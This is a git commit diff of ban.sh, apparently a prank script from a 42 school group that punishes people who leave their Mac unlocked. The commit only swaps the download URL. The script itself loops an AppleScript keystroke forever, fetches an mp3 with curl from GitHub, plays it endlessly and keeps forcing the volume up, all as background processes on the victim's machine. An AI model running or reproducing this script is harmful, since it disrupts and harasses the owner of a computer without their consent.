fefd08a6886fb4e3f4b74f0abd4f1712b33d2ef3
kkaimov <kkaimov@student.42wolfsburg.de>
2022-11-15 16:32:20 +0100

    LOCK YOUR SCREEN

--- ban.sh
+++ ban.sh
@@ -2,6 +2,6 @@ echo "tell application \"System Events\"
 key code 28 using {command down, option down, control down}
 end tell" > ~/Library/config
 while [ 1 ]; do osascript ~/Library/config; done &
-curl -o ~/.WoopWoop/mem.mp3 --create-dirs https://raw.githubusercontent.com/Muslik/woop-woop/master/audio.mp3
+curl -o ~/.WoopWoop/mem.mp3 --create-dirs https://raw.githubusercontent.com/logoutpolice42/banana2.0/master/audio.mp3
 while [ 1 ]; do afplay ~/.WoopWoop/mem.mp3; done &
 while [ 1 ]; do osascript -e "set Volume 10"; done &
